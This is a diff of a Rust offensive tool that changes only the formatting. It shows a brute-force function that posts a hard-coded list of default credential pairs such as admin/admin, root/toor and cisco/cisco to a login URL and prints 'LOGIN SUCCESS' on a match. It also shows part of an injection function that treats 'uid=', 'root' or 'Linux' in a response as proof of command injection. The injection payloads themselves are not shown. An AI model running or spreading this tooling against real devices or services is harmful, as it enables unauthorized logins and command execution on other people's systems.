@@ -3,7 +3,11 @@ use reqwest::Client;
 use std::time::Duration;
 
 fn build_client(timeout: u64) -> Client {
-    Client::builder().timeout(Duration::from_secs(timeout)).redirect(reqwest::redirect::Policy::none()).build().unwrap_or_else(|_| Client::new())
+    Client::builder()
+        .timeout(Duration::from_secs(timeout))
+        .redirect(reqwest::redirect::Policy::none())
+        .build()
+        .unwrap_or_else(|_| Client::new())
 }
 
 pub async fn brute(url: &str, timeout: u64) -> anyhow::Result<()> {
@@ -14,23 +18,35 @@ pub async fn brute(url: &str, timeout: u64) -> anyhow::Result<()> {
 
     let client = build_client(timeout);
     let creds = [
-        ("admin", "admin"), ("root", "root"), ("admin", "password"),
-        ("root", "toor"), ("admin", ""), ("root", ""),
-        ("user", "user"), ("guest", "guest"), ("admin", "1234"),
-        ("root", "password"), ("admin", "admin123"), ("cisco", "cisco"),
+        ("admin", "admin"),
+        ("root", "root"),
+        ("admin", "password"),
+        ("root", "toor"),
+        ("admin", ""),
+        ("root", ""),
+        ("user", "user"),
+        ("guest", "guest"),
+        ("admin", "1234"),
+        ("root", "password"),
+        ("admin", "admin123"),
+        ("cisco", "cisco"),
     ];
 
     for (user, pass) in &creds {
         let body = serde_json::json!({"username": user, "password": pass});
-        match client.post(url).json(&body).send().await {
-            Ok(r) => {
-                let status = r.status().as_u16();
-                let text = r.text().await.unwrap_or_default();
-                if status == 200 && (text.contains("ok") || text.contains("success") || text.contains("welcome")) {
-                    println!("  {} {:15}:{:15} — LOGIN SUCCESS", "[+]".green().bold(), user, if pass.is_empty() { "(empty)" } else { pass });
-                }
+        if let Ok(r) = client.post(url).json(&body).send().await {
+            let status = r.status().as_u16();
+            let text = r.text().await.unwrap_or_default();
+            if status == 200
+                && (text.contains("ok") || text.contains("success") || text.contains("welcome"))
+            {
+                println!(
+                    "  {} {:15}:{:15} — LOGIN SUCCESS",
+                    "[+]".green().bold(),
+                    user,
+                    if pass.is_empty() { "(empty)" } else { pass }
+                );
             }
-            Err(_) => {}
         }
     }
 
@@ -84,7 +100,9 @@ pub async fn inject(url: &str, timeout: u64) -> anyhow::Result<()> {
             Ok(r) => {
                 let status = r.status().as_u16();
                 let text = r.text().await.unwrap_or_default();
-                if status == 200 && (text.contains("root") || text.contains("uid=") || text.contains("Linux")) {
+                if status == 200
+                    && (text.contains("root") || text.contains("uid=") || text.contains("Linux"))
+                {
                     println!("  {} {:20} — INJECTION SUCCESS", "[!]".red().bold(), name);
                 } else {
                     println!("  {} {:20} — status={}", "[-]".dimmed(), name, status);
